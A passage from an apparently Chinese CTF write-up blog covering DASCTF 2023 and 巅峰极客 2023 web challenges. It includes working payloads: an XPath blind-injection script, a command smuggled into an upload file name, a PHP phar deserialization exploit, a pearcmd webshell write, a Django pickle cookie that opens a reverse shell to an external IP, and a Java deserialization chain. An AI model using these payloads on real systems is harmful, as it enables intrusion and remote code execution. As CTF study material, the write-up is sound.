class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>这里还是有两种解法</strong></p><ul><li>phar文件上传</li><li>system命令拼接</li></ul><p>审计了一下代码  </p><p><strong>得出解题思路</strong></p><p>就是先进行登录   然后传文件</p><p><img src="../images/image-20230726111533509.png" alt="image-20230726111533509"></p><p>主要是得进到这个里面  然后就会实例化<code>FILE</code>这个类</p><p><img src="../images/image-20230726111628995.png" alt="image-20230726111628995"></p><p>这里的时候就会触发phar反序列化了</p><p><strong>另一个拼接命令的方法如下</strong></p><p><img src="../images/image-20230726111717191.png" alt="image-20230726111717191"></p><p>就是通过恶意构造文件名  来通过最后的命令执行</p><p>通过审计代码发现  其实登不登陆成功对做题影响都不大(<strong>不爆破出密码的话可以强制文件上传  都一样的</strong>)</p><p><img src="../images/image-20230726111926604.png" alt="image-20230726111926604"></p><p><img src="../images/image-20230726112001895.png" alt="image-20230726112001895"></p><p>这两个判断登录成功与否的方法并不会直接把代码给阻断掉  <code>echo</code>完后还会继续执行后面的代码</p><p>这里其实有个<strong>xml盲注</strong>的考点可以学习学习</p><p><img src="../images/image-20230726114448432.png" alt="image-20230726114448432"></p><p>这里可以使用<strong>xml盲注</strong>来注出密码的 (<strong>xpath注入</strong>)   ——&gt;  <strong>目的不只是为了做题</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url =<span class="string">&#x27;http://1faab4d0-7d84-46a1-b6fb-5dc991bc7f72.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strs =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测根节点名称</span></span><br><span class="line">        <span class="comment"># payload_1 = &#123;&quot;username&quot;:&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&quot;.format(i,j),&quot;password&quot;:123&#125;</span></span><br><span class="line">        <span class="comment">#猜测子节点名称</span></span><br><span class="line">        <span class="comment"># payload_2 = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测accounts的节点</span></span><br><span class="line">        <span class="comment"># payload_3 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测user节点</span></span><br><span class="line">        <span class="comment"># payload_4 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#跑用户名和密码</span></span><br><span class="line">        <span class="comment"># payload_username =&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;.format(i,j)</span></span><br><span class="line">        payload_username =<span class="string">&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload_username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">123</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># payload_password =&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(payload_username)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line"><span class="comment">#003d7628772d6b57fec5f30ccbc82be1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;登录成功&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;登录失败&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>然后就可以把密码给爆破出来了</p><h3 id="system命令拼接"><a href="#system命令拼接" class="headerlink" title="system命令拼接"></a>system命令拼接</h3><p><img src="../images/image-20230726145115503.png" alt="image-20230726145115503"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 210</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5zDlxzonrJYj4N0m</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=4ca196683169f8034a864930f1f86e84</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary5zDlxzonrJYj4N0m</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;;echo bHMgLwo|base64 -d|bash;ajpg.jpg&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary5zDlxzonrJYj4N0m--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传成功后</p><p><img src="../images/image-20230726145658481.png" alt="image-20230726145658481"></p><p>通过<code>get</code>传参       <strong><code>?file=上传的文件名字</code></strong></p><p><img src="../images/image-20230726145829047.png" alt="image-20230726145829047"></p><p>成功拿到flag名字  之后修改这个文件名就能拿到flag了</p><h3 id="phar文件上传"><a href="#phar文件上传" class="headerlink" title="phar文件上传"></a>phar文件上传</h3><p>先生成一个phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="string">&quot;/;cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phartest.phar&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>然后上传图片  (<strong>修改后缀上传</strong>)</p><p><img src="../images/image-20230726153903059.png" alt="image-20230726153903059"></p><p>这里的话是<code>md5_file</code>来触发的</p><p><img src="../images/image-20230726153925874.png" alt="image-20230726153925874"></p><p>如果不填<code>todo=md5</code>的话  是不能触发的</p><p>(<strong>我也不知道为啥。。。。。。。。</strong>)</p><p><img src="../images/image-20230726162917937.png" alt="image-20230726162917937"></p><p><strong>按道理来说的话  在构造函数这里的时候已经触发这个<code>phar</code>了</strong></p><p><strong>解决了这个问题了</strong></p><p> 原因就是因为传进来的值会有<code>/</code>     然后就会进入正则  抛出异常</p><p><img src="../images/image-20230729003235802.png" alt="image-20230729003235802"></p><p>还是自己蠢了   tmd</p><h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><p>这题真狗  </p><p>但是尝试<strong>pearcmd</strong>没写入成功(当时<code>pearcmd.php</code>位置错了 没发现)</p><p>然后尝试sql写入半天  还是没成功</p><p>最后又返回来用<code>pearcmd</code>写入才成功  (发现了位置不对后才成功)</p><p><a href="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">Y4—熊海CMS代码审计</a></p><p>看这篇文章就行了</p><p><img src="../images/image-20230726164436791.png" alt="image-20230726164436791"></p><p>就是这里</p><p><strong>如果访问默认的<code>pearcmd.php</code>路径的话   这个题目是访问不到的</strong></p><p><img src="../images/image-20230726171220938.png" alt="image-20230726171220938"></p><p>问下<code>gpt</code>之后  发现了<code>/usr/share/php</code>这个位置  尝试之后发现成功了</p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/index.php?+config-create+/&amp;r=../../../../../../../../../usr/share/php/pearcmd&amp;/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>+/tmp/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726172057819.png" alt="image-20230726172057819"></p><p>然后进行文件包含</p><p><img src="../images/image-20230726172316775.png" alt="image-20230726172316775"></p><p><strong>成功写入</strong></p><p>然后直接RCE就行了</p><h2 id="ez-py"><a href="#ez-py" class="headerlink" title="ez_py"></a>ez_py</h2><p>这道题是参考这个 <a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E8%A2%AB%E6%B3%84%E6%BC%8F%E7%9A%84%E5%A7%9C%E6%88%88/README.md">hackergame2019</a>  出的题</p><p>这题考察得是<code>django</code>的<code>RCE</code></p><p><strong>拿到源码之后</strong></p><p>主要看里面的<code>settings.py</code>  这个文件</p><p><img src="../images/image-20230729154657238.png" alt="image-20230729154657238"></p><p><img src="../images/image-20230729154708124.png" alt="image-20230729154708124"></p><p>这里的话提供了<code>SECRET_KEY</code>   并且对<code>session</code>是进行<code>Pickle</code>反序列化解析的</p><p>通过这里的话我们就很清晰能得知可以通过伪造<code>session</code>来进行反序列化的</p><p><strong>并且在其官方文档里也提到了这个问题</strong></p><p><img src="../images/image-20230729154935067.png" alt="image-20230729154935067"></p><p><a href="https://docs.djangoproject.com/en/2.2/topics/http/sessions/#using-cookie-based-sessions">https://docs.djangoproject.com/en/2.2/topics/http/sessions/#using-cookie-based-sessions</a></p><p>然后我们就去搜索这几个关键字  得到一篇文章  并且是有poc的</p><p><img src="../images/image-20230729155304243.png" alt="image-20230729155304243"></p><p>题目给我们的附件中  可以看到<code>django</code>的版本</p><p><img src="../images/image-20230729155402295.png" alt="image-20230729155402295"></p><p><img src="../images/image-20230729155428512.png" alt="image-20230729155428512"></p><p>其实默认采用的是<code>json</code>的序列化   但是为了出题  作者将其改为了<code>pickle</code>序列化</p><p><img src="../images/image-20230729155759379.png" alt="image-20230729155759379"></p><p>本来实际上是这样的  但是并不影响我们自己修改成Pickle</p><p><strong>poc</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&#x27;p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn&#x27;</span></span><br><span class="line">salt = <span class="string">&quot;django.contrib.sessions.backends.signed_cookies&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> django.core.signing</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PickleSerializer</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Simple wrapper around pickle to be used in signing.dumps and</span></span><br><span class="line"><span class="string">    signing.loads.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dumps</span>(<span class="params">self, obj</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.loads(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Command</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (subprocess.Popen, ((<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/3389 &lt;&amp;1&quot;&#x27;</span>,),-<span class="number">1</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">False</span>, <span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">out_cookie= django.core.signing.dumps(</span><br><span class="line">    Command(), key=SECRET_KEY, salt=salt, serializer=PickleSerializer)</span><br><span class="line"><span class="built_in">print</span>(out_cookie)</span><br></pre></td></tr></table></figure><p>这里的话是先进行登录  然后将<code>cookie</code>修改为我们构造的  然后访问<code>auth</code>路由就行了</p><p>但是我这里没弹成功  不知道是<code>payload</code>的问题还是我的操作问题</p><h2 id="ez-timing"><a href="#ez-timing" class="headerlink" title="ez_timing"></a>ez_timing</h2><p>这道题考察的是http2</p><p><strong>确实符合题目说的一种很新的方式</strong></p><p>这里的话是参考github上这个出的题目  几乎一模一样</p><p><a href="https://github.com/ConnorNelson/spaceless-spacing">http2</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3MjcwOTAwNw==&amp;mid=2247484933&amp;idx=1&amp;sn=60ae6e59096e22a2b60bb7ba4e80ce04&amp;chksm=ceea68e5f99de1f3b072baf3c069c4f1530f5c17b34811e51133d42fbfe9de4638d5b5f14071&amp;mpshare=1&amp;scene=23&amp;srcid=072376b235QJm9tNCYWMZFQU&amp;sharer_sharetime=1690091289890&amp;sharer_shareid=9c0f9b7dd366a1431577547d077f70be#rd">这个wp中也写了这个题目的wp</a></p><p>好像这个题目的地址关了  所以我就没做了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;EzFlask&quot;&gt;&lt;a href=&quot;#EzFlask&quot; class=&quot;headerlink&quot; title=&quot;EzFlask&quot;&gt;&lt;/a&gt;EzFlask&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://tttang.com/archive/1876/#toc_obje</summary>
      
    
    
    
    
    <category term="DASCTF 2023 &amp; 0X401-Web" scheme="https://ke1nys.github.io/tags/DASCTF-2023-0X401-Web/"/>
    
  </entry>
  
  <entry>
    <title>巅峰极客2023-Web</title>
    <link href="https://ke1nys.github.io/posts/7d1902a5.html"/>
    <id>https://ke1nys.github.io/posts/7d1902a5.html</id>
    <published>2023-07-21T08:52:15.000Z</published>
    <updated>2023-07-29T08:13:42.304Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BabyURL"><a href="#BabyURL" class="headerlink" title="BabyURL"></a>BabyURL</h2><p><strong>审计代码得出一个思路</strong></p><p>就是在反序列化的时候会将得到的内容写入到  <code>/tmp/file</code>下</p><p>然后在<code>/file</code>下就可以读取到内容</p><p><img src="../images/image-20230721165726299.png" alt="image-20230721165726299"></p><p>题目把这个有反序列化入口的类给ban了  </p><p>这里的话就可以容易想到二次反序列化绕过</p><p>刚好就可以想到<code>SignedObject</code>这个jdk自带的类  </p><p>查看依赖发现没有什么特别的类可以用   于是就想到之前阿里云ctf里用过的<code>JackSon</code>这个类</p><p>刚好可以触发getter  </p><p>于是得出利用了链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException</span><br><span class="line">POJONode</span><br><span class="line">SignedObject</span><br></pre></td></tr></table></figure><p>所以最终的POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yancao.ctf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLHelper;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLVisiter;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.util.MyObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLHelper</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLHelper</span>(<span class="string">&quot;File:///F14gIsHereY0UGOTIT&quot;</span>);</span><br><span class="line">        <span class="type">URLVisiter</span> <span class="variable">urlVisiter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLVisiter</span>();</span><br><span class="line">        handler.visiter = urlVisiter;</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(handler,privateKey,signingEngine);</span><br><span class="line">        <span class="comment">//这个SignedObject传进来就是要反序列化的类</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="comment">//这里就是使用POJONode这个可以触发任意getter的方法 ----&gt;  来触发这个signedObject里的getObject()方法</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">URLHelper</span> <span class="variable">o</span> <span class="operator">=</span> (URLHelper)ois.readObject();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>通过这道题的话学到了一些新东西</strong></p><p><img src="../images/image-20230724101125766.png" alt="image-20230724101125766"></p><p>这道题的话其实也可以利用<code>netdoc</code>这个协议来读取文件内容   </p><p>(可以当作<code>file</code>协议的替代品)</p><h2 id="hellosql"><a href="#hellosql" class="headerlink" title="hellosql"></a>hellosql</h2><p>这里的话先是fuzz了一下  发现<strong>sleep benchmark rpad if count</strong> 都过滤了</p><p>然后在页面尝试测试了一下   猜测是个<strong>sql盲注</strong></p><p>(所以就猜测是用<strong>笛卡尔乘积</strong>)    </p><p>这里的话却不能使用这个常规的  (因为<code>count</code>和<code>if</code>都被ban了)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ((<span class="keyword">select</span> table_name <span class="keyword">from</span> 